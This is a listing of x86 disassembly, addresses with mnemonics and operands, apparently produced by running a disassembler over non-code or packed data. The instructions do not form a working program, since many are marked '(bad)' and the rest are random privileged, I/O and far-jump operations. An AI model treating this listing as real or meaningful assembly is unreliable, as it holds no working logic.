  6b882f:	mov    edx,0xef61c6bc
  6b8834:	out    dx,al
  6b8835:	jge    0x6b884e
  6b8837:	push   ds
  6b8838:	(bad)  
  6b8839:	xchg   ecx,eax
  6b883a:	fidiv  WORD PTR [ebx]
  6b883c:	(bad)  
  6b883d:	fldenv [esi-0x67]
  6b8840:	scas   eax,DWORD PTR es:[edi]
  6b8841:	sar    DWORD PTR [ebx+0x36],cl
  6b8844:	sub    ebx,esp
  6b8846:	loop   0x6b87fc
  6b8848:	mov    ecx,0xf8032709
  6b884d:	in     al,0x37
  6b884f:	daa    
  6b8850:	pop    eax
  6b8851:	js     0x6b88a9
  6b8853:	idiv   al
  6b8855:	rcl    ebp,1
  6b8857:	jb     0x6b8852
  6b8859:	aam    0xe5
  6b885b:	(bad)  
  6b885c:	ficom  DWORD PTR [ecx]
  6b885e:	ja     0x6b8803
  6b8860:	int    0x1c
  6b8862:	repz dec edi
  6b8864:	jmp    0x6b887b
  6b8866:	add    bl,BYTE PTR [ebp-0x71e813bc]
  6b886c:	loop   0x6b88de
  6b886e:	pop    ebx
  6b886f:	add    esi,DWORD PTR [ecx-0x60f19608]
  6b8875:	lea    ecx,[esi+0x6d]
  6b8878:	dec    esp
  6b8879:	test   eax,0x817b47c5
  6b887e:	ret    
  6b887f:	adc    DWORD PTR [edi],ecx
  6b8881:	jns    0x6b8863
  6b8883:	or     ebp,eax
  6b8885:	(bad)  
  6b8886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b8887:	ffreep st(0)
  6b8889:	xlat   BYTE PTR ds:[ebx]
  6b888a:	mov    eax,0x525144d7
  6b888f:	xchg   esp,eax
  6b8890:	in     eax,dx
  6b8891:	ret    
  6b8892:	cmc    
  6b8893:	(bad)  
  6b8894:	sub    eax,0xd8a4173c
  6b8899:	add    al,0xdc
  6b889b:	xchg   ecx,eax
  6b889c:	jae    0x6b887f
  6b889e:	xor    BYTE PTR [eax+0x6e],0xee
  6b88a2:	mov    ebp,DWORD PTR [esi-0x30]
  6b88a5:	inc    edx
  6b88a6:	retf   
  6b88a7:	inc    esp
  6b88a8:	xbegin 0x13a03a98
  6b88ae:	add    cl,BYTE PTR [ecx]
  6b88b0:	mov    ah,0x25
  6b88b2:	sti    
  6b88b3:	imul   ebp,DWORD PTR [esi+0x17],0xffffffde
  6b88b7:	call   0x613f808a
  6b88bc:	xchg   edx,eax
  6b88bd:	sub    BYTE PTR [eax-0x8],bl
  6b88c0:	dec    esi
  6b88c1:	daa    
  6b88c2:	iret   
  6b88c3:	xor    DWORD PTR [eax-0x25b892d8],esi
  6b88c9:	pop    es
  6b88ca:	mov    dh,0x5b
  6b88cc:	call   0x869a:0xa0ecc56c
  6b88d3:	dec    esp
  6b88d4:	or     ebx,DWORD PTR [edx-0x1dfa8b83]
  6b88da:	cmp    edx,DWORD PTR [edi-0x43]
  6b88dd:	xor    edx,edx
  6b88df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b88e0:	xchg   edi,eax
  6b88e1:	repz sahf 
  6b88e3:	sbb    BYTE PTR [eax-0x9],dl
  6b88e6:	popf   
  6b88e7:	mov    esi,0xa563f4a2
  6b88ec:	pop    ecx
  6b88ed:	lea    ebx,[ebx+0x4a256db7]
  6b88f3:	inc    edx
  6b88f4:	fiadd  DWORD PTR [ecx-0x75]
  6b88f7:	mov    esp,0x62c78193
  6b88fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b88fd:	lds    ebp,FWORD PTR [ecx+0x63e1a753]
  6b8903:	sbb    DWORD PTR [ebp-0x2ec0162a],ebx
  6b8909:	aas    
  6b890a:	fisubr WORD PTR [ebx+0x39958eb3]
  6b8910:	sbb    al,0xf3
  6b8912:	ror    BYTE PTR [eax-0x11],1
  6b8915:	fnstenv [edx+0x6face994]
  6b891b:	sbb    DWORD PTR [esi+0x43],esi
  6b891e:	pop    ecx
  6b891f:	icebp  
  6b8920:	repz dec edx
  6b8922:	inc    edi
  6b8923:	push   edx
  6b8924:	mov    ds:0x7f369185,eax
  6b8929:	sti    
  6b892a:	dec    ecx
  6b892b:	xor    ah,BYTE PTR fs:[edx]
  6b892e:	in     al,0xc4
  6b8930:	mov    eax,ds:0x81dfda7
  6b8935:	sahf   
  6b8936:	lods   eax,DWORD PTR ds:[esi]
  6b8937:	jl     0x6b88e5
  6b8939:	daa    
  6b893a:	mov    al,ds:0x24ff68ce
  6b893f:	fbstp  TBYTE PTR [edx-0x6b]
  6b8942:	mov    ds:0x8533f511,eax
  6b8947:	mov    eax,0xcaaafef0
  6b894c:	adc    edx,0x0
  6b894f:	sub    al,0x69
  6b8951:	mov    ch,0x2e
  6b8953:	test   eax,0xaa0f7542
  6b8958:	ins    DWORD PTR es:[edi],dx
  6b8959:	xchg   BYTE PTR [esi-0x7ba890ff],cl
  6b895f:	cmp    bh,ch
  6b8961:	lods   al,BYTE PTR ds:[esi]
  6b8962:	jnp    0x6b89bf
  6b8964:	ss sti 
  6b8966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b8967:	hlt    
  6b8968:	hlt    
  6b8969:	arpl   cx,dx
  6b896b:	pushf  
  6b896c:	dec    edi
  6b896d:	or     ah,0xdf
  6b8970:	outs   dx,DWORD PTR ds:[esi]
  6b8971:	mov    ch,0xfc
  6b8973:	(bad)  [edx+edx*2]
  6b8976:	in     al,0x30
  6b8978:	dec    esp
  6b8979:	add    al,al
  6b897b:	xchg   DWORD PTR [eax+0x34],ecx
  6b897e:	pop    esp
  6b897f:	cmp    DWORD PTR [ebx-0x4c0b2ed6],esi
  6b8985:	mov    dh,0x5d
  6b8987:	cdq    
  6b8988:	jbe    0x6b896f
  6b898a:	and    dh,BYTE PTR [ecx-0x5f]
  6b898d:	sub    BYTE PTR [edi],bh
  6b898f:	mov    al,0x4b
  6b8991:	outs   dx,DWORD PTR ds:[esi]
  6b8992:	cmp    edi,esi
  6b8994:	iret   
  6b8995:	mov    cl,0x72
  6b8997:	(bad)  
  6b8999:	rol    DWORD PTR [ebx-0x31],cl
  6b899c:	jne    0x6b895f
  6b899e:	scas   eax,DWORD PTR es:[edi]
  6b899f:	push   0x8b827605
  6b89a4:	(bad)  
  6b89a5:	fidivr DWORD PTR [edi-0x70]
  6b89a8:	hlt    
  6b89a9:	loope  0x6b8a0b
  6b89ab:	and    DWORD PTR [ecx+0x392da1a8],ebp
  6b89b1:	or     DWORD PTR [ebx+0xe5e419e],edi
  6b89b7:	(bad)  
  6b89b8:	(bad)  
  6b89b9:	cmp    bl,BYTE PTR [ecx+0x453cd6b1]
  6b89bf:	push   ds
  6b89c0:	dec    esi
  6b89c1:	sti    
  6b89c2:	xor    eax,DWORD PTR [edi-0x3ed03fee]
  6b89c8:	lods   eax,DWORD PTR ds:[esi]
  6b89c9:	dec    esi
  6b89ca:	pushf  
  6b89cb:	dec    esi
  6b89cc:	dec    ecx
  6b89cd:	jne    0x6b8994
  6b89cf:	cmc    
  6b89d0:	adc    DWORD PTR [edx+0x34d21e35],esi
  6b89d6:	loop   0x6b89ee
  6b89d8:	sbb    BYTE PTR [edx-0x40ec97c1],0xc2
  6b89df:	imul   eax,DWORD PTR [ecx],0x47
  6b89e2:	push   edi
  6b89e3:	sahf   
  6b89e4:	enter  0x2765,0x91
  6b89e8:	popa   
  6b89e9:	jmp    0x7929:0x6c537803
  6b89f0:	test   al,0x9
  6b89f2:	adc    bh,BYTE PTR [edi]
  6b89f4:	and    BYTE PTR [edi+esi*4],cl
  6b89f7:	jo     0x6b8a41
  6b89f9:	sbb    al,0xcc
  6b89fb:	shr    BYTE PTR [edi+0x33],0xcb
  6b89ff:	jne    0x6b8a55
  6b8a01:	into   
  6b8a02:	fistp  QWORD PTR [esi+0x17]
  6b8a05:	test   dh,ah
  6b8a07:	jmp    0x6fe9c697
  6b8a0c:	aam    0xcb
  6b8a0e:	inc    edi
  6b8a0f:	ss or  bh,0x64
  6b8a13:	gs or  eax,0x8427d2ae
  6b8a19:	aam    0x9d
  6b8a1b:	(bad)  
  6b8a1c:	mov    ah,0x68
  6b8a1e:	jmp    0x6b8a8b
  6b8a20:	mov    ah,0xe5
  6b8a22:	xor    al,0x59
  6b8a24:	outs   dx,DWORD PTR ds:[esi]
  6b8a25:	jb     0x6b8a65
  6b8a27:	inc    esp
  6b8a28:	jne    0x6b8a9a
  6b8a2a:	xor    al,0xfa
  6b8a2c:	int3   
  6b8a2d:	inc    eax
  6b8a2e:	imul   dl
  6b8a30:	cmp    BYTE PTR [edx-0xe76ec9f],dh
  6b8a36:	stos   DWORD PTR es:[edi],eax
  6b8a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b8a38:	jno    0x6b8a99
  6b8a3a:	icebp  
  6b8a3b:	sar    BYTE PTR [ebp-0x62],0x81
  6b8a3f:	in     al,0xd
  6b8a41:	and    al,0x9f
  6b8a43:	ja     0x6b8a67
  6b8a45:	jns    0x6b8a75
  6b8a47:	mov    ecx,0x5526baa8
  6b8a4c:	push   edx
  6b8a4d:	push   dx
  6b8a4f:	je     0x6b8a86
  6b8a51:	mov    eax,ds:0x900d426e
  6b8a56:	out    dx,al
  6b8a57:	rcr    BYTE PTR [esi],cl
  6b8a59:	pop    ebx
  6b8a5a:	mov    dl,BYTE PTR [edi]
  6b8a5c:	sti    
  6b8a5d:	sbb    DWORD PTR [eax-0x45],esi
  6b8a60:	or     al,0xf3
  6b8a62:	xor    ecx,DWORD PTR [eax+0x3d8d28c5]
  6b8a68:	push   es
  6b8a69:	jmp    0x6b8ab2
  6b8a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b8a6c:	pop    ebx
  6b8a6d:	or     edi,DWORD PTR [eax+ecx*4]
  6b8a70:	in     al,dx
  6b8a71:	nop
  6b8a72:	std    
  6b8a73:	mov    ecx,0xb670d449
  6b8a78:	xor    ebx,DWORD PTR [ebx+0x32ed4216]
  6b8a7e:	mov    ebx,DWORD PTR [ecx+0x2a]
  6b8a81:	sub    edx,ebx
  6b8a83:	mov    cl,0xfb
  6b8a85:	xchg   sp,ax
  6b8a87:	stc    
  6b8a88:	xchg   BYTE PTR [ebx-0x13b3bdac],dh
  6b8a8e:	sbb    BYTE PTR [esi],ch
  6b8a90:	cmp    DWORD PTR [eax+0x2c],0xffffffa4
  6b8a94:	rcl    ecx,0xc8
  6b8a97:	ds leave 
  6b8a99:	cmp    al,0x9
  6b8a9b:	xchg   DWORD PTR [edx-0x6c],esi
  6b8a9e:	outs   dx,BYTE PTR ds:[esi]
  6b8a9f:	adc    ebx,ecx
  6b8aa1:	mov    ch,0x64
  6b8aa3:	sub    ah,BYTE PTR [ebx-0x4563af7b]
  6b8aa9:	pop    ebp
  6b8aaa:	popf   
  6b8aab:	ss out 0x39,al
  6b8aae:	outs   dx,BYTE PTR ds:[esi]
  6b8aaf:	pop    ss
  6b8ab0:	mov    ebx,0x274baba3
  6b8ab5:	icebp  
  6b8ab6:	dec    edx
  6b8ab7:	mov    al,ds:0xd990cd74
  6b8abc:	mov    edi,0x2356300b
  6b8ac1:	push   ecx
  6b8ac2:	std    
  6b8ac3:	mov    al,0x56
  6b8ac5:	mov    ch,0x2a
  6b8ac7:	xchg   DWORD PTR [ecx+0x2c1cdeba],eax
  6b8acd:	loope  0x6b8b29
  6b8acf:	dec    edx
  6b8ad0:	stos   DWORD PTR es:[edi],eax
  6b8ad1:	popf   
  6b8ad2:	in     eax,0xfd
  6b8ad4:	imul   ebx,DWORD PTR [edx-0x6a451cd3],0xfffffff3
  6b8adb:	fst    st(5)
  6b8add:	in     eax,0x53
  6b8adf:	sbb    esi,DWORD PTR [edx]
  6b8ae1:	mov    edx,0x536eec0d
  6b8ae6:	cmp    al,ch
  6b8ae8:	and    ebx,DWORD PTR [edx+0x16]
  6b8aeb:	aaa    
  6b8aec:	(bad)  
  6b8aed:	ja     0x6b8a8e
  6b8aef:	cmc    
  6b8af0:	dec    esp
  6b8af1:	fucomi st,st(3)
  6b8af3:	pop    edx
  6b8af4:	dec    ebp
  6b8af5:	cmp    al,0xeb
  6b8af7:	repz adc cl,BYTE PTR [ebp+0x671f2281]
  6b8afe:	dec    edi
  6b8aff:	ja     0x6b8b13
  6b8b01:	enter  0xa474,0x4e
  6b8b05:	jle    0x6b8a88
  6b8b07:	xchg   ebp,eax
  6b8b08:	mov    bl,0x97
  6b8b0a:	stos   BYTE PTR es:[edi],al
  6b8b0b:	dec    esi
  6b8b0c:	inc    esi
  6b8b0d:	loope  0x6b8b7c
  6b8b0f:	pop    ss
  6b8b10:	jg     0x6b8b17
  6b8b12:	retf   
  6b8b13:	fisttp DWORD PTR [edi+0x68cc25d8]
  6b8b19:	inc    BYTE PTR [edi]
  6b8b1b:	retf   0x6aff
  6b8b1e:	inc    ebp
  6b8b1f:	ins    BYTE PTR es:[edi],dx
  6b8b20:	inc    edx
  6b8b21:	loop   0x6b8acd
  6b8b23:	js     0x6b8b0e
  6b8b25:	cwde   
  6b8b26:	fbstp  TBYTE PTR [edi-0x5e]
  6b8b29:	out    0x3f,al
  6b8b2b:	test   eax,0xa8ff9c75
  6b8b30:	retf   
  6b8b31:	add    al,0x61
  6b8b33:	adc    DWORD PTR [ebp-0x5934bd47],ebp
  6b8b39:	ds js  0x6b8aef
  6b8b3c:	xchg   BYTE PTR [esi],bh
  6b8b3e:	dec    eax
  6b8b3f:	adc    BYTE PTR [ebx-0x1ba4c4b1],dh
  6b8b45:	fistp  DWORD PTR [ecx+0x404b7d38]
  6b8b4b:	ds sbb al,0x3e
  6b8b4e:	(bad)  
  6b8b4f:	adc    al,0xb3
  6b8b51:	lahf   
  6b8b52:	call   0x600149
  6b8b57:	mov    ds:0x148e5449,eax
  6b8b5c:	jae    0x6b8b9b
  6b8b5e:	xchg   edi,ecx
  6b8b60:	pop    eax
  6b8b61:	fs (bad) 
  6b8b63:	fldenv [edx+0xf]
  6b8b66:	and    BYTE PTR [esi-0x66],al
  6b8b69:	test   ebx,ebx
  6b8b6b:	sub    ebp,DWORD PTR [ebx+0x5a]
  6b8b6e:	adc    eax,0x6cf299d8
  6b8b73:	stos   BYTE PTR es:[edi],al
  6b8b74:	inc    eax
  6b8b75:	sti    
  6b8b76:	dec    edi
  6b8b77:	jo     0x6b8b46
  6b8b79:	mov    BYTE PTR [eax+esi*8-0x3a5d3ce4],bh
  6b8b80:	cmp    al,0xc1
  6b8b82:	jne    0x6b8be0
  6b8b84:	push   eax
  6b8b85:	pusha  
  6b8b86:	xchg   edi,eax
  6b8b87:	je     0x6b8b94
  6b8b89:	in     eax,0x88
  6b8b8b:	loopne 0x6b8b2b
  6b8b8d:	aam    0x97
  6b8b8f:	mov    BYTE PTR [ebx],0x45
  6b8b92:	std    
  6b8b93:	adc    BYTE PTR [edi],ah
  6b8b95:	xor    esi,DWORD PTR ds:0x9bd05c3f
  6b8b9b:	jmp    0x113b:0x20a827f0
  6b8ba2:	jae    0x6b8bd5
  6b8ba4:	sub    DWORD PTR [edx+0x7e],esi
  6b8ba7:	lods   al,BYTE PTR ds:[esi]
  6b8ba8:	push   edi
  6b8ba9:	xchg   edx,eax
  6b8baa:	lahf   
  6b8bab:	mov    esp,0xb1f22043
  6b8bb0:	and    eax,0xf5b0610
  6b8bb5:	les    eax,FWORD PTR [ebp+0x0]
  6b8bb8:	mov    cl,0xfc
  6b8bba:	jge    0x6b8c1a
  6b8bbc:	scas   eax,DWORD PTR es:[edi]
  6b8bbd:	and    BYTE PTR [edi+0x73],ah
  6b8bc0:	repnz sbb BYTE PTR ds:0x282c3009,cl
  6b8bc7:	inc    esp
  6b8bc8:	inc    ebx
  6b8bc9:	scas   al,BYTE PTR es:[edi]
  6b8bca:	sbb    al,al
  6b8bcc:	cmp    DWORD PTR [edi+0x3027a8a8],esp
  6b8bd2:	test   DWORD PTR [esi],esi
  6b8bd4:	cmp    DWORD PTR [edi-0x641b8ede],esi
  6b8bda:	jmp    0xc92eae83
  6b8bdf:	dec    ecx
  6b8be0:	dec    DWORD PTR [eax+0x53]
  6b8be3:	out    0x6d,al
  6b8be5:	add    DWORD PTR fs:[edi+0x3b012f18],edi
  6b8bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b8bed:	pop    esp
  6b8bee:	sbb    esp,ebx
  6b8bf0:	repnz mov ecx,0x5ea8318f
  6b8bf6:	daa    
  6b8bf7:	int    0x38
  6b8bf9:	icebp  
  6b8bfa:	jp     0x6b8be3
  6b8bfc:	popa   
  6b8bfd:	push   es
  6b8bfe:	popa   
  6b8bff:	jb     0x6b8c4e
  6b8c01:	dec    esi
  6b8c02:	add    dh,BYTE PTR [ecx-0x28c37dbd]
  6b8c08:	dec    ebx
  6b8c09:	(bad)  
  6b8c0a:	fcmovb st,st(2)
  6b8c0c:	adc    dh,ch
  6b8c0e:	ins    BYTE PTR es:[edi],dx
  6b8c0f:	enter  0x19a1,0xfd
  6b8c13:	jp     0x6b8c38
  6b8c15:	mov    ah,0xc8
  6b8c17:	repz fnsetpm(287 only) 
  6b8c1a:	(bad)
  6b8c1d:	mov    eax,0xa4fb4b4c
  6b8c22:	fist   DWORD PTR [edi-0x75]
  6b8c25:	fmul   st(6),st
  6b8c27:	add    al,0x1b
  6b8c29:	pop    ebx
  6b8c2a:	fidiv  DWORD PTR [edi]
  6b8c2c:	jecxz  0x6b8c77
  6b8c2e:	jmp    0xbaec3560
  6b8c33:	call   0xdceb:0x880e2b4
  6b8c3a:	cmp    BYTE PTR [esp+ebx*4+0x2],ah
  6b8c3e:	mov    ds:0x85fc02e8,al
  6b8c43:	mov    ebp,0x95dd7163
  6b8c48:	fcom   QWORD PTR [esi+0x921beda]
  6b8c4e:	jae    0x6b8c6b
  6b8c50:	lock sbb DWORD PTR [esp+ecx*1],ecx
  6b8c54:	jl     0x6b8c00
  6b8c56:	bts    DWORD PTR [ebp+0x4407e64b],edi
  6b8c5d:	icebp  
  6b8c5e:	add    eax,DWORD PTR [ebx-0x7632bee3]
  6b8c64:	in     eax,dx
  6b8c65:	mov    dh,0x2a
  6b8c67:	test   BYTE PTR [ebx+0x16],bh
  6b8c6a:	in     eax,0xab
  6b8c6c:	addr16 out 0x1b,al
  6b8c6f:	xchg   ebp,eax
  6b8c70:	stos   DWORD PTR es:[edi],eax
  6b8c71:	jb     0x6b8cb4
  6b8c73:	mov    esi,0x215c7b1f
  6b8c78:	loope  0x6b8bff
  6b8c7a:	jl     0x6b8c4e
  6b8c7c:	pop    ebx
  6b8c7d:	adc    al,0x37
  6b8c7f:	test   BYTE PTR [esi],ch
  6b8c81:	idiv   BYTE PTR [edx]
  6b8c83:	jo     0x6b8c38
  6b8c85:	(bad)  
  6b8c86:	push   esi
  6b8c87:	jg     0x6b8ca6
  6b8c89:	fcom   DWORD PTR [ecx+0x67]
  6b8c8c:	sub    al,0x7d
  6b8c8e:	aas    
  6b8c8f:	loop   0x6b8d0d
  6b8c91:	repnz pusha 
  6b8c93:	mov    bh,BYTE PTR [esi+edx*4+0x1e]
  6b8c97:	jo     0x6b8c8f
  6b8c99:	push   ss
  6b8c9a:	lock cli 
  6b8c9c:	cmp    al,0x9
  6b8c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b8c9f:	jg     0x6b8c81
  6b8ca1:	icebp  
  6b8ca2:	stc    
  6b8ca3:	inc    edi
  6b8ca4:	clc    
  6b8ca5:	aas    
  6b8ca6:	mov    eax,ds:0x6c713188
  6b8cab:	mov    ds:0xbfcc880b,al
  6b8cb0:	ds aaa 
  6b8cb2:	pop    edi
  6b8cb3:	mov    ecx,0x4033ed17
  6b8cb8:	(bad)  
  6b8cb9:	std    
  6b8cba:	push   ss
  6b8cbb:	jbe    0x6b8c50
  6b8cbd:	test   DWORD PTR [edx-0x11],esi
  6b8cc0:	jae    0x6b8d0f
  6b8cc2:	ins    DWORD PTR es:[edi],dx
  6b8cc3:	popa   
  6b8cc4:	aad    0x3a
  6b8cc6:	fcmovnbe st,st(7)
  6b8cc8:	jp     0x6b8cbe
  6b8cca:	gs jecxz 0x6b8c5c
  6b8ccd:	lods   al,BYTE PTR ds:[esi]
  6b8cce:	lods   al,BYTE PTR ds:[esi]
  6b8ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b8cd0:	xchg   esp,eax
  6b8cd1:	xchg   edx,eax
  6b8cd2:	ret    0xb461
  6b8cd5:	ins    BYTE PTR es:[edi],dx
  6b8cd6:	sahf   
  6b8cd7:	retf   0x3317
  6b8cda:	lahf   
  6b8cdb:	and    ebx,DWORD PTR [esi+edi*2-0x72]
  6b8cdf:	mov    eax,0xbbb755b7
  6b8ce4:	out    dx,al
  6b8ce5:	out    0x61,al
  6b8ce7:	inc    esi
  6b8ce8:	xchg   esp,eax
  6b8ce9:	mov    ecx,0xe825104d
  6b8cee:	cmp    BYTE PTR [ecx],dl
  6b8cf0:	push   esi
  6b8cf1:	pushf  
  6b8cf2:	aaa    
  6b8cf3:	adc    DWORD PTR [ecx],ecx
  6b8cf5:	sub    esp,eax
  6b8cf7:	ret    
  6b8cf8:	retf   
  6b8cf9:	ins    DWORD PTR es:[edi],dx
  6b8cfa:	mov    WORD PTR [esi+ebp*4+0x76],?
  6b8cfe:	es push ds
  6b8d00:	xchg   esi,eax
  6b8d01:	call   0xa44597da
  6b8d06:	dec    esp
  6b8d07:	pop    ebp
  6b8d08:	call   0x1148:0x28fb8ebb
  6b8d0f:	pop    edx
  6b8d10:	out    0xcf,al
  6b8d12:	lods   al,BYTE PTR ds:[esi]
  6b8d13:	(bad)  
  6b8d14:	jno    0x6b8d33
  6b8d16:	mov    DWORD PTR [edx],esi
  6b8d18:	das    
  6b8d19:	push   ebx
  6b8d1a:	jle    0x6b8d4d
  6b8d1c:	jl     0x6b8d81
  6b8d1e:	xchg   ebx,eax
  6b8d1f:	xchg   DWORD PTR [ebp+0x3],ecx
  6b8d22:	mov    al,BYTE PTR [ebx]
  6b8d24:	mov    edi,0x6a5cf8bb
  6b8d29:	adc    al,0x4f
  6b8d2b:	imul   ecx,DWORD PTR fs:[ebx-0x2c],0x5e
  6b8d30:	ror    DWORD PTR [esi],cl
  6b8d32:	(bad)  
  6b8d33:	and    esp,ebx
  6b8d35:	xor    BYTE PTR [ebx],dl
  6b8d37:	mov    ecx,0xca43a05b
  6b8d3c:	dec    ecx
  6b8d3d:	xor    dl,BYTE PTR [edi+esi*2+0x76ce834]
  6b8d44:	sti    
  6b8d45:	nop
  6b8d46:	(bad)  
  6b8d47:	jmp    0x6b8d86
  6b8d49:	mov    ecx,0xc08b96c
  6b8d4e:	dec    edx
  6b8d4f:	ds pop ecx
  6b8d51:	pop    edx
  6b8d52:	and    eax,0x7a7dabbd
  6b8d57:	fistp  WORD PTR [esi+edx*8-0x78]
  6b8d5b:	inc    esi
  6b8d5c:	dec    edx
  6b8d5d:	or     ah,al
  6b8d5f:	push   ebp
  6b8d60:	cmp    BYTE PTR [edx],cl
  6b8d62:	push   cs
  6b8d63:	sbb    dl,BYTE PTR [ebp+ebx*4-0xc]
  6b8d67:	xchg   DWORD PTR [ebx],esi
  6b8d69:	cmp    eax,0xa59f23cd
  6b8d6e:	and    DWORD PTR [ebx+ebx*4],edi
  6b8d71:	cmp    BYTE PTR [edx+0x16],cl
  6b8d74:	outs   dx,BYTE PTR ds:[esi]
  6b8d75:	pop    ss
  6b8d76:	mov    gs,WORD PTR [edi]
  6b8d78:	or     al,BYTE PTR [esi-0x2d]
  6b8d7b:	mov    ah,0x0
  6b8d7d:	or     DWORD PTR [ecx],0xb61395be
  6b8d83:	add    al,0x95
  6b8d86:	imul   DWORD PTR [edx+0x1f98db6]
  6b8d8c:	(bad)  
  6b8d8d:	and    ch,BYTE PTR [eax-0x4ec63c91]
  6b8d93:	ss fwait
  6b8d95:	pop    esi
  6b8d96:	push   es
  6b8d97:	mov    ebp,0xc82ffd9e
  6b8d9c:	out    dx,al
  6b8d9d:	push   ebp
  6b8d9e:	mov    esp,0xa682138c
  6b8da3:	scas   al,BYTE PTR es:[edi]
  6b8da4:	mov    esp,0xc2364586
  6b8da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b8daa:	xchg   BYTE PTR [edi+edx*1+0x14],dl
  6b8dae:	mov    al,BYTE PTR [esi]
  6b8db0:	sbb    esi,esp
  6b8db2:	fmul   DWORD PTR [edx]
  6b8db4:	jg     0x6b8d43
  6b8db6:	jae    0x6b8d44
  6b8db8:	sub    al,0xae
  6b8dba:	nop
  6b8dbb:	fisttp QWORD PTR gs:[esi+0x4e8df109]
  6b8dc2:	push   0x4f
  6b8dc4:	leave  
  6b8dc5:	dec    ecx
  6b8dc6:	js     0x6b8de9
  6b8dc8:	dec    edi
  6b8dc9:	(bad)  
  6b8dca:	sahf   
  6b8dcb:	call   0x16de5832
  6b8dd0:	xor    BYTE PTR [esi+eiz*8+0x65],0x4f
  6b8dd5:	add    ah,BYTE PTR [eax+0x7f]
  6b8dd8:	mov    dh,0x86
  6b8dda:	(bad)  
  6b8ddb:	pop    edx
  6b8ddc:	imul   ecx,edx,0x60ddbbde
  6b8de2:	mov    dl,0xd1
  6b8de4:	push   es
  6b8de5:	out    0xe2,al
  6b8de7:	test   eax,0xe0346498
  6b8dec:	xlat   BYTE PTR ds:[ebx]
  6b8ded:	call   0xa3f587f8
  6b8df2:	inc    esp
  6b8df3:	stos   DWORD PTR es:[edi],eax
  6b8df4:	cmp    eax,0x8240045d
  6b8df9:	xor    BYTE PTR [ecx-0x18],bh
  6b8dfc:	jle    0x6b8def
  6b8dfe:	test   al,0x7a
  6b8e00:	mov    cl,BYTE PTR [edi-0x22]
  6b8e03:	cdq    
  6b8e04:	cld    
  6b8e05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b8e06:	add    eax,DWORD PTR [ebx+ebp*8-0x58]
  6b8e0a:	push   ebx
  6b8e0b:	ja     0x6b8e75
  6b8e0d:	sub    esp,DWORD PTR [ecx-0x1a]
  6b8e10:	cmc    
  6b8e11:	adc    al,0xf0
  6b8e13:	jmp    0xd6f90fcc
  6b8e18:	mov    ebx,0xeeeb73c3
  6b8e1d:	ror    DWORD PTR [edi],0x19
  6b8e20:	xor    BYTE PTR [eax],dl
  6b8e22:	fild   QWORD PTR [eax+0x1d]
  6b8e25:	lods   al,BYTE PTR ds:[esi]
  6b8e26:	out    0x19,eax
  6b8e28:	jae    0x6b8df1
  6b8e2a:	xor    eax,0x92e0bcb2
  6b8e2f:	push   0x77312f7f
  6b8e34:	xchg   ecx,eax
  6b8e35:	and    al,0x37
  6b8e37:	sti    
  6b8e38:	pop    esi
  6b8e39:	(bad)  
  6b8e3a:	les    esi,FWORD PTR [esi+0x17]
  6b8e3d:	adc    esp,DWORD PTR [esi+edx*1]
  6b8e40:	sub    ebx,esi
  6b8e42:	cmp    eax,0x44349449
  6b8e47:	mov    bh,0x0
  6b8e49:	jle    0x6b8e56
  6b8e4b:	iret   
  6b8e4c:	mov    ebx,0x159c7760
  6b8e51:	inc    ebp
  6b8e52:	call   0x1e3d:0x43470508
  6b8e59:	or     BYTE PTR [ecx+0x4e],ah
  6b8e5c:	bound  edi,QWORD PTR [ebx]
  6b8e5e:	arpl   WORD PTR [edx-0x1faad617],si
  6b8e64:	mov    eax,ds:0xcf252a74
  6b8e69:	fmul   st(0),st
  6b8e6b:	aaa    
  6b8e6c:	mov    esi,esi
  6b8e6e:	and    al,0xf4
  6b8e70:	mov    edi,0x3344dc4
  6b8e75:	sub    DWORD PTR [edx+esi*2-0x73739496],ecx
  6b8e7c:	aad    0xe3
  6b8e7e:	leave  
  6b8e7f:	call   DWORD PTR [ebx]
  6b8e81:	sub    DWORD PTR [ecx+0x2b44c994],edi
  6b8e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b8e88:	mov    cl,0xb2
  6b8e8a:	jno    0x6b8e87
  6b8e8c:	ins    BYTE PTR es:[edi],dx
  6b8e8d:	ins    DWORD PTR es:[edi],dx
  6b8e8e:	inc    esp
  6b8e8f:	dec    edx
  6b8e90:	ins    DWORD PTR es:[edi],dx
  6b8e91:	pop    esi
  6b8e92:	bound  esi,QWORD PTR [edi]
  6b8e94:	mov    ch,0x1e
  6b8e96:	sbb    al,0xa8
  6b8e98:	rol    BYTE PTR [eax],cl
  6b8e9a:	add    bl,ah
  6b8e9c:	adc    DWORD PTR [ebx],esi
  6b8e9e:	aam    0xba
  6b8ea0:	fs push ss
  6b8ea2:	bound  ebx,QWORD PTR [edi]
  6b8ea4:	adc    al,0xc1
  6b8ea6:	je     0x6b8eb8
  6b8ea8:	sbb    ebx,esp
  6b8eaa:	addr16 pop edx
  6b8eac:	pop    ecx
  6b8ead:	or     ebx,DWORD PTR [eax-0x6e]
  6b8eb0:	jl     0x6b8f2b
  6b8eb2:	sub    al,0x80
  6b8eb4:	dec    edi
  6b8eb5:	cli    
  6b8eb6:	xor    DWORD PTR [edi+0xbdbeb74],0x742c5093
  6b8ec0:	jns    0x6b8f17
  6b8ec2:	clc    
  6b8ec3:	xor    cl,BYTE PTR [ecx+0x39]
  6b8ec6:	imul   esi,edx,0xffffff8c
  6b8ec9:	or     eax,0x4d3b5f67
  6b8ece:	add    BYTE PTR [edx+0x27],cl
  6b8ed1:	imul   edi,edx,0x4d
  6b8ed4:	pop    es
  6b8ed5:	call   DWORD PTR [edi-0x45]
  6b8ed8:	addr16 push es
  6b8eda:	out    0xeb,eax
  6b8edc:	dec    ebx
  6b8edd:	shr    BYTE PTR [edx],0x9a
  6b8ee0:	cld    
  6b8ee1:	fistp  QWORD PTR [ebp-0x69]
  6b8ee4:	dec    edi
